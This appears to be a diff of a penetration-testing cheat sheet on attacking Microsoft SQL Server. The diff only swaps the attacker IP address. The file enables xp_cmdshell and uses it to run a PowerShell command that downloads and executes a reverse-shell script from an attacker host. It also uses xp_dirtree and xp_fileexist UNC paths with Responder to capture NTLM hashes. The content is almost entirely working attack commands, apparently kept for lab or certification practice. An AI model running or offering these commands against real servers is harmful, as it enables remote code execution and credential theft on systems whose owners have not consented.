@@ -9,7 +9,7 @@ enable_xp_cmdshell
 RECONFIGURE
 
 xp_cmdshell whoami
-xp_cmdshell powershell.exe -C "IEX (New-Object Net.WebClient).DownloadString(''http://10.10.16.112/Invoke-PowerShellTcp.ps1'')"
+xp_cmdshell powershell.exe -C "IEX (New-Object Net.WebClient).DownloadString(''http://192.168.119.149/Invoke-PowerShellTcp.ps1'')"
 
 or 
 
@@ -23,7 +23,7 @@ go
 reconfigure
 
 xp_cmdshell powershell  whoami
-xp_cmdshell powershell.exe -C "IEX (New-Object Net.WebClient).DownloadString(''http://10.10.16.112/Invoke-PowerShellTcp.ps1'')"
+xp_cmdshell powershell.exe -C "IEX (New-Object Net.WebClient).DownloadString(''http://192.168.119.149/Invoke-PowerShellTcp.ps1'')"
 
 sqsh -S 10.10.10.59 -U usermame -P mypassword
 
@@ -34,6 +34,6 @@ or
 responder -I tun1 -wrfv 
 
 
-exec xp_dirtree '\\10.10.16.112\test\port_forwarding'
+exec xp_dirtree '\\192.168.119.149\test\port_forwarding'
 
-exec xp_fileexist '\\10.10.16.112\test\port_forwarding'
+exec xp_fileexist '\\192.168.119.149\test\port_forwarding'
